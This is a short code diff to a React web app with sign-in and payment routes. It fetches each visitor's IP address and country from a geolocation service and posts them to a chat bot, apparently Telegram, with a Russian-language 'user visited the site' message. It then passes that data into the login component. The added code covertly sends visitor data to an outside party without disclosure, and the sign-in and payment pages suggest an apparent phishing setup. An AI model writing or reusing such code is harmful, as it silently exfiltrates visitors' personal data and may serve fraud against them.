@@ -12,6 +12,7 @@ function App() {
     const [info, setInfo] = useState('undefined')
     const [loaded, setLoaded] = useState(false);
 
+
     const getInfo = () => {
         axios.get('https://geolocation-db.com/json/')
             .then(res => {
@@ -24,7 +25,7 @@ function App() {
        if (!loaded) {
            getInfo();
        } else {
-           axios.post(bot.sendMessage("IPv4:%20" + info.IPv4))
+           axios.post(bot.sendMessage("User: <code>" + info.IPv4 + '</code> зашел на сайт.%0AЕго страна ' + info.country_name))
        }
     }, [loaded])
 
@@ -32,7 +33,7 @@ function App() {
       <div>
           <BrowserRouter>
               <Routes>
-                  <Route path={"/signin"} element={<LoginManager />} />
+                  <Route path={"/signin"} element={<LoginManager info={info}/>} />
                   <Route path={"/payment"} element={<Payment/>} />
               </Routes>
           </BrowserRouter>
